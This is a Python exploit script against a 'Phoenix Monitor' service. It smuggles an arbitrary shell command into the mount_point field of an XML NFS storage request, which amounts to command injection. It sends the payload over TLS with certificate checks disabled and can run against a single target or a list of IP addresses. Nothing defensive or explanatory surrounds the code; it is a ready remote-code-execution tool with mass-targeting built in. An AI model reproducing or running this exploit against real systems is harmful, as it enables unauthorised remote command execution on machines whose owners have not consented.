#!/usr/bin/python3
import argparse
import socket
import struct
import ssl

payload = """<TEST_STORAGE type="nfs">
    <server_ip>127.0.0.1</server_ip>
    <mount_point>/lala; {};</mount_point>
</TEST_STORAGE>
"""

def send_command(target: str, port: int, payload: str):
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)  # Set timeout for the socket to 5 seconds
        try:
            with c.wrap_socket(s, server_hostname=target) as ss:
                ss.connect((target, port))

                msg = b''
                msg += struct.pack('<I', 81)
                msg += struct.pack('<I', len(payload))
                msg += struct.pack('<I', 1075724911)
                msg += struct.pack('<I', 0)
                msg += payload.encode()
                print(f'\033[94m[*] Sending to {target}:\n{payload}\033[0m')  # Blue text

                ss.sendall(msg)
                print(f'\033[92m[+] Sent to {target}!\033[0m')  # Green text

                d = ss.recv(1024)
                print(f'\033[92m[+] Received from {target}: {d}\033[0m')  # Green text
                return d
        except (ssl.SSLError, socket.error) as e:
            print(f'\033[91m[!] Error connecting to {target}: {e}\033[0m')  # Red text
            return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target')
    parser.add_argument('-l', '--list', help='File containing list of IP addresses')
    parser.add_argument('-p', '--port', help='The port of the Phoenix Monitor service', type=int, default=7900)
    parser.add_argument('-c', '--command', help='The command to blindly execute', required=True)
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error('No target specified, add -t or -l')

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, 'r') as f:
            targets.extend([line.strip() for line in f])

    for target in targets:
        response = send_command(target, args.port, payload.format(args.command))
        if response:
            if b'success' in response.lower():
                print(f'\033[92m[+] Success response from {target}: {response}\033[0m')  # Green text
            else:
                print(f'\033[91m[!] Failed response from {target}: {response}\033[0m')  # Red text
